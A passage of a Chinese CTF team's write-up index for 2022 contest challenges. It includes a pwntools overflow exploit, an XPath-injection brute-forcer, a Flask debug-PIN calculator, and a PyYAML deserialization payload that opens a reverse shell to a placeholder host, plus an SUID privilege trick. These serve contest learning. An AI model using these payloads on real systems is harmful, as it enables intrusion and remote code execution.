c=a+70\nu8 flag=c+b\n</code></pre> <p>\u662f HeLang\uff01 \u8fd0\u884c\u540e\u5f97\u5230 <code>flag{different_xor}</code>\u3002</p>"},{"location":"Writeup/2022mtctf/HED/#re","title":"RE","text":""},{"location":"Writeup/2022mtctf/HED/#re-small","title":"RE-small","text":"<p>\u7a0b\u5e8f\u76f4\u63a5\u8dd1\u4e0d\u8d77\u6765\uff0c\u653eIDA\u91cc\u4ece\u5165\u53e3\u8ddf\u8fdb\uff0cnop\u6389\u6ca1\u7528\u7684\u82b1\u8df3\u8f6c\uff0c\uff08\u5176\u5b9e\u4e0d\u4fee\u4e5f\u53ef\u4ee5\uff0c\u4f46\u662f\u627e\u4e0d\u5230\u6570\u636e\u5730\u5740\uff09</p> <p> </p> <p>\u7136\u540e\u5c31\u80fd\u770b\u5230\u52a0\u5bc6\u903b\u8f91,\u6ca1\u6709\u9b54\u6539\u7684\u539f\u7248TEA\uff0c\u8f6e\u657035\uff0ckey\u786c\u7f16\u7801\u3002</p> <p></p> <p>\u8fd8\u53ef\u4ee5\u770b\u5230\u6bd4\u8f83\u7684\u6570\u7ec4\uff0c\u5bfc\u51fa\u4e4b\u540e\u5199\u89e3\u5bc6\u811a\u672c\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;iostream&gt;\nuint32_t dword_100F7[9] ={\n  -569872061,\n  -990307374,\n\n  -621356324,\n  1839125836,\n\n  1978355431,\n  1562237956,\n\n  1360728025,\n  1373407483,\n\n  0,\n};\n\nvoid decrypt(uint32_t* v) {\n  uint32_t round = 35;\n  uint32_t delta = 1732584193; \n  uint32_t v0 = v[0], v1 = v[1], sum = delta * round, i; \n  uint32_t k0 = 1, k1 = 35, k2 = 69, k3 = 103;\n  for (i = 0; i &lt; round; i++) {\n    v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);\n    v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);\n    sum -= delta;\n  }\n  v[0] = v0; v[1] = v1;\n}\n\nint main(){\n  for (int i = 0; i &lt; 8; i += 2) {\n    decrypt(&amp;dword_100F7[i]);\n  }\n  printf(\"%s\\n\", dword_100F7);\n  return 0;\n}\n</code></pre>"},{"location":"Writeup/2022mtctf/HED/#pwn","title":"PWN","text":""},{"location":"Writeup/2022mtctf/HED/#_1","title":"\u6349\u8ff7\u85cf","text":"<p>\u6ea2\u51fa\u70b9\u85cf\u5230\u4e00\u5927\u5806\u5206\u652f\u7684\u552f\u4e00\u7ed3\u679c\u91cc\uff0c\u4e0d\u8fc7\u8fc7\u4e00\u904d27\u4e2agetline\u5c31\u80fd\u627e\u5230\u6ea2\u51fa\u7684\u4f4d\u7f6e\u3002 \u4e4b\u540e\u60f3\u8ba9angr\u81ea\u52a8\u8dd1\u51fa\u6765\uff0c\u597d\u50cf\u6548\u679c\u5e76\u4e0d\u7406\u60f3\uff0c\u4e8e\u662f\u8003\u8651\u624b\u52a8\u63a8\u7b97</p> <p>\u7ed3\u679c\u53d1\u73b0\u6bd4\u8f83\u51fd\u6570\u6709\u7ecf\u5178\u7684\u6f0f\u6d1e\uff0c\u53ea\u8981\u8ba9\u7528\u6237\u8f93\u5165\u4e3a\u622a\u65ad\u7b26\u5c31\u4f1a\u8fd4\u56de\u901a\u8fc7\uff0c\u6240\u4ee5\u76f4\u63a5\u9001\u4e00\u58060\u8fdb\u53bb\uff0c\u4e0d\u8fc7\u6700\u540e\u4e00\u4e2a\u56e0\u4e3aXOR\u4e86\u9996\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e8e\u4ea6\u6216\u7684\u503c\u3002</p> <p>\u62ff\u5230\u6ea2\u51fa\u70b9\u4e4b\u540eret\u5230\u540e\u95e8\u5c31\u53ef\u4ee5\u4e86</p> <pre><code>from pwn import *\n\np=remote(\"39.106.27.2\",36329)\np.sendafter(b\"sbAmJLMLWm:\", b\"0 0 0 0 0 0 0 0 \")\np.sendafter(b\"HuEqdjYtuWo:\", b\"\\x00\"*0x33)\np.sendafter(b\"hbsoMdIRWpYRqvfClb:\", b\"\\x00\"*0x35)\np.sendafter(b\"tfAxpqDQuTCyJw:\", b\"\\x00\"*0x22)\np.sendafter(b\"UTxqmFvmLy:\", b\"0 0 0 9254 0 0 0 0 \")\np.sendafter(b\"LLQPyLAOGJbnm:\", b'\\x3c'+b\"\\00\"*0x29)\np.sendafter(b\"gRGKqIlcuj:\", b'a'*0xf+b'b'*8+p64(0x401331)*4)\np.interactive()\np.close()\n</code></pre>"},{"location":"Writeup/2022mtctf/HED/#web","title":"WEB","text":""},{"location":"Writeup/2022mtctf/HED/#babyjava","title":"babyjava(\u4e00\u8840)","text":"<p>\u770b\u5927\u4f6c\u7684\u535a\u5ba2\uff1ahttps://xz.aliyun.com/t/7791?page=1</p> <p>\u524d\u8fb9\u7684\u5224\u65ad\u65b9\u6cd5(root-user-username)\u535a\u5ba2\u91cc\u90fd\u6709\uff0c\u800c\u4e14\u662f\u5e38\u89c1\u540d\u7206\u7834\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5c31\u80fd\u731c\u5230\u4e86 <code>xpath=user1' and substring(name(/*[1]), 3, 1)='o'  and ''='</code> \u6700\u540e\u6ce8\u5230\u7b2c\u4e8c\u4e2aflag\u4e0a\u811a\u672c\uff0c\u5f88\u5feb\u5c31\u80fd\u51fa\u6765  </p> <pre><code>import requests\n\nfor n in range(80):\n    for i in \"abcdef0123456789-{}\":\n        r = requests.post(\"http://eci-2zef43pmhep3nhrjor7d.cloudeci1.ichunqiu.com:8888/hello\",\n                          data={\n                              \"xpath\": f\"\"\"user1' and substring((//user[position()=1]/username[position()=2]),{n},1) = '{i}'  and ''='\"\"\"\n                          })\n        if \"information \" not in r.text:\n            print(i, end=\"\")\n            break\n</code></pre>"},{"location":"Writeup/2022mtctf/HED/#onlineunzip","title":"OnlineUnzip","text":"<p>zip\u5f88\u5bb9\u6613\u6784\u9020../\u7684\u6587\u4ef6\u540d\uff08\u6bd4\u5982\u624b\u52a8patch\u6216\u8005\u4e22\u7ed9java\u751f\u6210\uff09\uff0c\u4e5f\u5f88\u5bb9\u6613\u88ab\u5f00\u53d1\u8005\u9632\u5230  </p> <p>\u8f6f\u94fe\u63a5\u662f\u53e6\u4e00\u79cdzip\u653b\u51fb\u7684\u65b9\u6cd5\uff0c\u89e3\u51b3\u65b9\u6cd5\u662f\u7528\u4fee\u8865\u8fc7\u7684unzip\uff0c\u4f46\u770b\u8d77\u6765\u8fd9\u9053\u9898\u6ca1\u4fee  </p> <p>\u8fd9\u9053\u9898\u6bd4\u8f83\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u76f4\u63a5\u628a<code>/</code>\u6839\u76ee\u5f55ln\u51fa\u6765\uff0c\u8fd9\u6837\u76f4\u63a5\u5c31\u80fd\u4efb\u610f\u6587\u4ef6\u8bfb\uff0c\u4f46\u8bfbflag\u4f1a\u63d0\u793a\u65e0\u6743\u9650 </p> <p>\u7136\u540e\u6ce8\u610f\u5230debug=True\uff0c\u4f46\u4e4b\u524d\u6ca1\u505a\u8fc7Flask\u63a7\u5236\u53f0\u7684\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u5361\u4e86\u4e24\u4e2a\u591a\u5c0f\u65f6\uff0c\u75db\u5931\u4e00\u8840  </p> <p>\u5f00\u4e86debug\u4e4b\u540e\u4e0d\u4ec5\u6709\u62a5\u9519\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7/console\u8fdb\u5165\u63a7\u5236\u53f0\uff0c\u5f53\u7136\u9ad8\u7248\u672c\u9700\u8981\u8f93\u5165pin\uff0c\u4f46\u8fd9\u4e2apin\u662f\u53ef\u8ba1\u7b97\u7684</p> <p>\u4e0d\u8fc7\u7f51\u4e0a\u7684\u811a\u672c\u90fd\u4e0d\u600e\u4e48\u80fd\u7528\uff0c\u5e72\u8106\u628a\u670d\u52a1\u5668\u7684pin\u751f\u6210\u4ee3\u7801\u62c9\u4e0b\u6765\u770b\u770b\uff0c\u7136\u540e\u518d\u6539\uff0c\u4e8e\u662f\u5c31\u6709\uff1a</p> <pre><code>import hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'ctf',  # /etc/passwd\n    'flask.app',  # \u9ed8\u8ba4\n    'Flask',  # \u9ed8\u8ba4\n    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # \u62a5\u9519\u6216\u8005\u60f3\u529e\u6cd5\u62ff\n]\n# docker\u73af\u5883\u53d6 1 3 \uff0c \u5176\u4f59\u5e94\u8be5\u6ca1\u67093\nprivate_bits = [\n    '95529876171',  # /sys/class/net/ens0/address\n    '96cec10d3d9307792745ec3b85c89620'  # /etc/machine-id \n    # 'c5938f8f-1a6f-4e03-8a6e-4fed4f38afa9' # /proc/sys/kernel/random/boot_id \n    'e6714e8f0c24bf998ff3953127d9a0f60e30b712b0cda501c207092fd26bfc18'  # /proc/self/cgroup\n]\n\n# 3.6\u662fmd5\uff0c3.8\u662fsha1\nh = hashlib.sha1()\n\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode(\"utf-8\")\n    h.update(bit)\nh.update(b\"cookiesalt\")\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\nh.update(b\"pinsalt\")\nnum = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\nfor group_size in 5, 4, 3:\n    if len(num) % group_size == 0:\n        rv = \"-\".join(\n            num[x: x + group_size].rjust(group_size, \"0\")\n            for x in range(0, len(num), group_size)\n        )\n        print(rv)\n</code></pre> <p>\u6709\u4e86pin\u5c31\u53ef\u4ee5RCE\u4e86\uff0c\u6ca1\u6d4b\u63a7\u5236\u53f0\u80fd\u4e0d\u80fd\u76f4\u63a5\u8bfb\uff0c\u53cd\u5f39\u7684shell\u53ef\u4ee5\u8bfbflag</p>"},{"location":"Writeup/2022mtctf/HED/#crypto","title":"Crypto","text":""},{"location":"Writeup/2022mtctf/HED/#strange_rsa1","title":"strange_rsa1","text":"<p>RSA\uff0c\u5df2\u77e5\u9ad8\u7cbe\u5ea6\u4e0b\u7684 p/q\uff0c\u6c42 p \u548c q\u3002 \u7528 sage \u8fd0\u884c\uff0c\u53d1\u73b0\u7cbe\u5ea6\u8db3\u591f\uff0c\u76f4\u63a5\u80fd\u89e3\u51fa\u6765\u3002</p> <pre><code># exp.sage\nfrom Crypto.Util.number import *\n\ne = 0x10001\nn = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413\nc = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924\ngift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938\n\nq_sq = n / gift\nq_e = sqrt(q_sq)\nq = int(q_e)\n\nassert n % q == 0\np = n / q\n\nphi = int((p-1)*(q-1))\nd = inverse(e, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"Writeup/2022wdbs1/readme/","title":"2022-\u7f51\u9f0e\u676f\u9752\u9f99\u7ec4-\u521d\u8d5b-HED-WriteUp","text":"<p>Rank: 7 1016pts 9Solved \u9752\u9f99\u7ec4\u603b\u7b2c8\uff0c\u7ec4\u5185\u9ad8\u6821\u8d5b\u9053\u7b2c7 <code>HED \u662f\u5357\u65b9\u79d1\u6280\u5927\u5b66COMPASS\u5b9e\u9a8c\u5ba4\u7684CTF\u6218\u961f</code></p> <ul> <li>2022-\u7f51\u9f0e\u676f\u9752\u9f99\u7ec4-\u521d\u8d5b-HED-WriteUp</li> <li>Web</li> <li>web669</li> <li>Crypto (AK)</li> <li>crypto162 \uff08\u4e8c\u8840\uff09</li> <li>crypto405</li> <li>crypto091</li> <li>Re</li> <li>re693\uff08\u4e00\u8840\uff09</li> <li>re694</li> <li>PWN</li> <li>pwn349</li> <li>pwn497</li> <li>MISC</li> <li>\u7b7e\u5230\uff1a</li> </ul> <p></p>"},{"location":"Writeup/2022wdbs1/readme/#web","title":"Web","text":""},{"location":"Writeup/2022wdbs1/readme/#web669","title":"web669","text":"<p>\u9996\u5148\u55b5\u4e00\u4e0b\u4ee3\u7801\uff0c\u53d1\u73b0\u4e0a\u4f20\u6587\u4ef6\u9700\u8981 <code>session['user'] == 'Administrator'</code>\uff0c\u7136\u540e\u7ffb\u4e00\u4e0b session \u7684 secret key\uff0c\u53d1\u73b0\uff1a</p> <pre><code>app.config['SECRET_KEY'] = socket.gethostname()\n</code></pre> <p>\u770b\u5230hostname\u8003\u8651\u5e73\u53f0\u7684Docker\u73af\u5883\u53ef\u80fd\u662f\u4e00\u6837\u7684\uff0c\u679c\u65ad\u767b\u5f55CTF\u5927\u672c\u8425\u6253\u5f00\u767e\u5ea6\u676f\u7684SSTI\u9898\u76ee  </p> <p>\u6478\u4e86\u4e00\u4e0b hostname \u5f97\u5230\u8fd4\u56de\u503c <code>engine-1</code>\uff0c\u9a8c\u8bc1\u53d1\u73b0\u679c\u7136\u662f\u8fd9\u4e2a\u3002</p> <p> </p> <p>\u62ff\u5230\u4e86 SECRET_KEY \u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u968f\u4fbf\u6539 <code>session</code> \u4e86\uff0c\u4e5f\u5c31\u662f <code>user</code> \u548c <code>updir</code> \u90fd\u80fd\u968f\u4fbf\u6539\u3002</p> <p>\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u73b0\u5728\u5c31\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\u4e86\u3002\u5e76\u4e14\u7531\u4e8e\u53ef\u4ee5\u63a7\u5236 <code>updir</code>\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\uff0c\u4e5f\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u5199\u4e86\uff08\u53ea\u8981\u6709\u6743\u9650\uff09\u3002</p> <p>\u7136\u540e\u53d1\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u6ca1\u4ec0\u4e48\u7528\uff08~~\u4e3b\u8981\u662f\u8bfb\u4e0d\u5230 flag~~\uff09\uff0c\u7136\u540e\u5c1d\u8bd5\u5199\u6587\u4ef6\u4e5f\u5199\u4e0d\u5230 <code>templates</code> \u91cc\u9762\u53bb\uff08\u4e8b\u540e\u53d1\u73b0\u786e\u5b9e\u6ca1\u90a3\u4e2a\u76ee\u5f55\u7684\u6743\u9650\uff09\uff0c\u6240\u4ee5\u5269\u4e0b\u53ea\u6709 <code>yaml.load</code> \u53ef\u4ee5\u5229\u7528\u4e86\u3002</p> <p>\u7136\u540e <code>yaml</code> \u8fc7\u6ee4\u4e86 <code>system</code> \u7b49\u5173\u952e\u8bcd\uff0c\u6240\u4ee5\u4e00\u4e2a\u6bd4\u8f83\u7701\u4e8b\u7684\u529e\u6cd5\u5c31\u662f\u5148 base64 \u4e00\u4e0b\u7136\u540e\u518d eval\u3002</p> <p>\u7136\u540e\u81f3\u4e8e\u600e\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u903b\u8f91\uff0c\u7ffb\u4e86\u4e00\u5708\u5927\u4f6c\u7684\u6587\u7ae0\uff0c\u6700\u540e\u53d1\u73b0\u4e00\u4e2a\u80fd\u7528\u7684\uff1a</p> <p>https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</p> <p>\u5927\u4f6c\u6ca1\u7ed9\u51fa\u5b9e\u73b0\uff0c\u81ea\u5df1\u6309\u5927\u4f6c\u535a\u5ba2\u7684\u601d\u8def\u5b9e\u73b0\u4e00\u4e0b\uff1a</p> <pre><code>!!python/object/new:bytes\n- !!python/object/new:map\n  - !!python/name:eval\n  - !!python/object/new:map\n    - !!python/name:base64.b64decode\n    - [\"{BASE64 HERE}\"]\n</code></pre> <p>\u7ffb\u8bd1\u8fc7\u6765\u5176\u5b9e\u5c31\u662f <code>bytes(map(eval, map(base64.b64decode, 'BASE64 HERE')))</code>\u3002\u7136\u540e base64 \u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u586b\u4e00\u4e2a\u5e38\u89c4\u7684\u53cd\u5f39 shell\uff1a   </p> <pre><code>exec(\"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"YOUR-IP\\\",PORT)); \nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\")\n</code></pre> <p>\u7136\u540e\u628a\u8fd9\u4e2a yaml \u4e0a\u4f20\u5230\u4e00\u4e2a <code>/display</code> \u80fd\u8bbf\u95ee\u5230\u7684\u4f4d\u7f6e\u4e0a\uff08\u5373\u8981\u63d0\u524d\u7b97\u597d md5\uff09\uff0c\u7136\u540e\u518d\u7528 <code>/display</code> \u6478\u4e00\u4e0b\uff0c\u5c31\u80fd\u6267\u884c\u4e86\u3002\u6267\u884c\u5b8c\u4e86\u4e4b\u540e\uff0c\u5c31\u62ff\u5230\u4e86 shell\u3002</p> <p>\u4f46\u662f\u7ffb\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0 <code>/flag</code> \u597d\u50cf\u6ca1\u6743\u9650\u8bfb\u3002</p> <p><code>find -perm -u=s -type f 2&gt;/dev/null</code> \u904d\u5386\u6709suid\u6743\u9650\u7684\u7a0b\u5e8f\uff0c\u53d1\u73b0\u9664\u4e86\u6b63\u5e38\u7684\u7a0b\u5e8f\u5916\u6709dd</p> <p>\u8003\u8651dd\u5199passwd\u63d0\u5230root\uff0c\u4f46\u662f\u961f\u91cc\u795e\u4ed9\u5e08\u5085\u76f4\u63a5\u7528 <code>dd if=/flag of=copy</code> \u590d\u5236\u4e86\u4e00\u4efd flag\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8bfb\u4e86\u3002</p> <p>\u4e0a\u9762 web \u90e8\u5206\u7684\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from itsdangerous import URLSafeTimedSerializer\nimport base64\nimport flask\nimport hashlib\nimport os\nimport requests\n\ndef dump_cookies(secret_key, data):\n    return URLSafeTimedSerializer(\n        secret_key,\n        salt = 'cookie-session',\n        serializer = flask.json.tag.TaggedJSONSerializer(),\n        signer_kwargs = dict(key_derivation = \"hmac\", digest_method = hashlib.sha1),\n    ).dumps(data)\n\ndef create_rar(target, contents):\n    for (file, content) in contents.items():\n        with open(file, 'w') as f:\n            f.write(content)\n        os.system(f'rar a {target} {file}')\n\ndef create_session(key):\n    data = { 'user': 'Administrator', 'updir': 'fileinfo' }\n    return dump_cookies(key, data)\n\ndef create_yaml_payload():\n    command = f'exec(\"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n    s.connect((\\\\\\\"YOUR-IP\\\\\\\",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\n     os.dup2(s.fileno(),2); p=subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"]);\")'\n    command_encode = base64.b64encode(command.encode()).decode()\n\n    return f'''\n!!python/object/new:bytes\n- !!python/object/new:map\n  - !!python/name:eval\n  - !!python/object/new:map\n    - !!python/name:base64.b64decode\n    - [\"{command_encode}\"]'''\n\ndef main():\n    dummy_filename = 'monad'\n    dummy_filename_md5 = hashlib.md5(dummy_filename.encode()).hexdigest()\n    rar = f'.1.rar'\n    create_rar(rar, { f'{dummy_filename_md5}.yaml': create_yaml_payload() })\n\n    session = create_session('engine-1')\n    url = 'http://eci-2ze2kqsxzki5jel0ux1b.cloudeci1.ichunqiu.com:8888'\n    r = requests.post(url + '/upload', cookies={'session': session}, files={'file': open(rar, 'rb')})\n    r = requests.get(url + '/display', cookies={'session': session}, params={'file': dummy_filename})\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Writeup/2022wdbs1/readme/#crypto-ak","title":"Crypto (AK)","text":""},{"location":"Writeup/2022wdbs1/readme/#crypto162","title":"crypto162 \uff08\u4e8c\u8840\uff09","text":"<p>\u9996\u5148\uff0c\u55ef\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b\u4ee3\u7801\uff1a</p> <pre><code>def cal(i, cof):\n    if i &lt; 3:\n        return i + 1\n    else:\n        return cof[2] * cal(i-3, cof) + cof[1] * cal(i-2, cof) + cof[0] * cal(i-1, cof)\n</code></pre> <p>\u7136\u540e\u4e00\u770b\uff0c\u5783\u573e\u9012\u5f52\uff0c\u987a\u624b\u628a\u4ed6\u6539\u6210\u8fed\u4ee3\u7684\uff1a</p> <pre><code>MOD = 10 ** 2010\nbuffer = [1, 2, 3] + [ 0 for _ in range(200000 + 1) ]\n\ns = 0\nfor cof in cof_t:\n    for j in range(3, 200000+1):\n        buffer[j] = (cof[2] * buffer[j-3] + cof[1] * buffer[j-2] + cof[0] * buffer[j - 1]) % MOD\n    s = (s + buffer[200000]) % MOD\n</code></pre> <p>\u7136\u540e\u53c8\u56e0\u4e3a\u540e\u9762\u6709 <code>s=str(s)[-2000:-1000]</code>\uff0c\u6240\u4ee5\u987a\u4fbf\u6a21\u4e00\u4e0b $2^{2000}$ \u6b21\u65b9\uff0c\u4e0d\u4f1a\u5bf9\u7b54\u6848\u4ea7\u751f\u5f71\u54cd\u3002</p> <p>\u7136\u540e\u672c\u6765\u8fd8\u60f3\u7740\u8981\u4e0d\u8981\u7ee7\u7eed\u4f18\u5316\u7684\uff0c\u4f46\u662f\u521a\u60f3\u51fa\u6765\u600e\u4e48\u4f18\u5316\uff0c\u4e0a\u9762\u7684\u90a3\u6bb5\u4ee3\u7801\u5c31\u8dd1\u51fa\u6765\u4e86\u3002</p> <p>\u7136\u540e\u62ff\u7740\u8f93\u51fa\u7684 <code>s</code> \u9a8c\u7b97\u4e00\u4e0b\uff0c\u662f\u53ef\u4ee5\u5bf9\u4e0a <code>verify</code> \u7684\u3002\u7136\u540e\u2026\u2026\u7136\u540e\u5c31\u7528 AES \u89e3\u5bc6\u5c31\u89e3\u51fa\u6765\u5566\uff1f</p>"},{"location":"Writeup/2022wdbs1/readme/#crypto405","title":"crypto405","text":"<p>\u7531\u4e8e <code>k</code> \u4e00\u76f4\u5728\u66f4\u65b0\uff0c\u6709\u70b9\u96be\u5206\u6790\uff0c\u4e0d\u59a8\u7ed9 <code>k</code> \u52a0\u4e00\u7ef4\uff08\u5373 <code>i</code> \u76f8\u5173\uff09\uff0c\u4e8e\u662f\u4ee3\u7801\u5c31\u662f\uff1a</p> <pre><code>for i in range(len(flag)):\n    k[i][0] = flag[i]\n    for j in range(1, 5+1):\n        k[i][j] = k[i][j - 1] * k[i - 1][j] % p\n    print('Grasshopper#' + str(i).zfill(2) + ':' + hex(k[i][5])[2:].zfill(4))\n</code></pre> <p>\u7136\u540e\u4e0d\u96be\u53d1\u73b0\uff0c<code>k</code> \u91cc\u9762\u7684\u6bcf\u4e2a\u503c\uff0c\u4f1a\u4e14\u4f1a\u88ab\u8d4b\u503c\u4e00\u6b21\u3002\u5e76\u4e14\u7528 <code>k[i][j]</code> \u548c <code>k[i - 1][j]</code> \u53ef\u4ee5\u8ba1\u7b97\u51fa <code>k[i][j - 1]</code>\uff08\u56e0\u4e3a <code>p</code> \u662f\u8d28\u6570\uff0c\u6240\u4ee5\u76f4\u63a5\u6c42\u9006\u5373\u53ef\uff09\u3002</p> <p>\u7136\u540e output.txt \u91cc\u9762\u7ed9\u51fa\u4e86\u6700\u540e\u7684 <code>k</code>\uff0c\u5373 <code>k[..][5]</code>\u3002\u4e8e\u662f\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u4e0a\u9762\u6240\u8bf4\u7684\u65b9\u6cd5\uff0c\u4ece <code>k[..][5]</code> \u7b97\u51fa <code>k[..][4]</code>\uff0c\u4ece <code>k[..][4]</code> \u7b97\u51fa <code>k[..][3]</code>\u2026\u2026\u76f4\u81f3\u7b97\u51fa <code>k[..][0]</code>\uff0c\u4e5f\u5c31\u662f flag\u3002</p> <p>\u6240\u4ee5\u6700\u540e\u7684\u8fc7\u7a0b\u5c31\u662f\u679a\u4e3e <code>p</code>\uff0c\u7136\u540e\u5bf9 <code>k</code> \u505a\u9006\u8fd0\u7b97\u6c42\u51fa <code>flag</code>\uff0c\u5e76\u987a\u4fbf\u5224\u65ad\u4e00\u4e0b flag \u5408\u4e0d\u5408\u6cd5\uff08\u9700\u8981\u662f\u53ef\u6253\u5370\u5b57\u7b26\uff09\u3002</p> <pre><code>from Crypto.Util.number import *\nimport more_itertools\nimport string\n\nout = [ 0x2066, 0xa222, 0xcbb1, 0xdbb4, 0xdeb4, 0xb1c5, 0x33a4, 0xc051, 0x3b79, 0x6bf8,\n 0x2131, 0x2c40, 0x91ba, 0x7b44, 0x5f25, 0x0208, 0x7edb, 0x62b5, 0xcec5, 0x5ab3, 0x3c46,\n  0xc272, 0x714b, 0x9e0b, 0x48ee, 0x44cc, 0x05a0, 0x3da3, 0x11b1, 0x259f, 0x899d, 0xa130,\n   0xe58f, 0x23f3, 0x5829, 0x6beb, 0x3681, 0x0054, 0xa189, 0x2765, 0xc63d, 0xbc68 ]\n\ndef solve_with(p):\n    now = out\n    for k in range(5):\n        now = [ y * pow(x, -1, p) % p for x, y in more_itertools.windowed(now, n=2, step=1) ]\n    if max(now) &lt; 256:\n        print(bytes(now))\n\nfor p in range(max(out) + 1, 2**16):\n    if isPrime(p):\n        solve_with(p)\n</code></pre>"},{"location":"Writeup/2022wdbs1/readme/#crypto091","title":"crypto091","text":"<p>\u5df2\u77e5 sha(\u624b\u673a\u53f7) = <code>c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc</code>\uff0c\u4e14\u201c\u624b\u673a\u53f7\u662f170\u53f7\u6bb5\u9996\u6279\u653e\u53f7\u7684\u8054\u901a\u53f7\u7801\u201d\u3002</p> <p>\u8054\u901a\u53f7\u7801\uff0c\u90a3\u80af\u5b9a\u662f\u4e2d\u56fd\u7684\uff0c\u6240\u4ee5\u56fd\u5bb6\u4ee3\u7801\u662f <code>86</code>\uff0c\u7136\u540e\u201c\u9996\u6279\u653e\u53f7\u7684\u8054\u901a\u53f7\u7801\u201d\uff0c\u7a0d\u5fae\u67e5\u4e00\u4e0b\uff0c\u5c31\u80fd\u53d1\u73b0\u53f7\u7801\u6bb5\u662f <code>1709</code>\uff0c\u591a\u4e00\u4f4d\u3002\u6240\u4ee5\u624b\u673a\u53f7\u7684\u524d 6 \u4f4d\u5c31\u51fa\u6765\u4e86\uff1a<code>861709</code>\u3002</p> <p>\u7136\u540e sha \u51fa\u6765\u7684\u957f\u5ea6\u662f 64 \u4f4d\u7684 hex\uff0c\u6240\u4ee5\u8fd9\u662f\u4e2a sha256\u3002</p> <p>\u7528 hashcat \u8dd1\u4e00\u4e0b\u6700\u540e\u7684 7 \u4f4d\u6570\u5b57\uff1a</p> <pre><code>$ hashcat -a 3 -m 1400 'c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc' '861709?d?d?d?d?d?d?d' -O --force\n\n...\nc22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc:8617091733716\n...\n</code></pre> <p>\u5c31\u53ef\u4ee5\u62ff\u5230\u624b\u673a\u53f7\uff1a<code>8617091733716</code>\uff08\u4e5f\u5c31\u662f flag\uff09\u3002</p>"},{"location":"Writeup/2022wdbs1/readme/#re","title":"Re","text":""},{"location":"Writeup/2022wdbs1/readme/#re693","title":"re693\uff08\u4e00\u8840\uff09","text":"<p>go\u6b63\u5411\uff0c\u6309\u903b\u8f91\u628a\u524d\u4e24\u4e2aprint\u7684\u5b57\u7b26\u4e32\u62ff\u51fa\u6765\uff1a</p> <pre><code>Input the first function, which has 6 parameters and the third named gLIhR: \nInput the second function, which has 3 callers and invokes the function named cHZv5op8rOmlAkb6: \n</code></pre> <p>\u4e0a\u8fb9\u5f88\u591a\u51fd\u6570\uff0c\u4f46\u4e00\u641c\u5305\u542b\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u590d\u6742\u5ea6\u53ea\u6709180*50\uff0c\u597d\u50cf\u633a\u80fd\u63a5\u53d7\u7684</p> <p>\u6b63\u5219\u641c\u4e00\u4e0b\u7b2c\u4e00\u4e2a\uff0c\u53d1\u73b0\u53ea\u6709\u4e94\u4e2a\u5339\u914d\uff08\u8fd9\u91cc\u540e\u534a\u6bb5\u8d2a\u5fc3\u4e86\uff0c\u8089\u773c\u8fc7\u4e00\u904d\u53d1\u73b0\u5b9e\u9645\u53ea\u6709\u4e00\u4e2a\u662f\u6b63\u786e\u7684\uff09</p> <p><code>\\(.*?,.*?, gLIhR.*?,.*?, .*?, .*?\\)</code></p> <p>\u5c31\u627e\u5230\u4e86\u7b2c\u4e00\u6bb5\u7684\u7b54\u6848 </p> 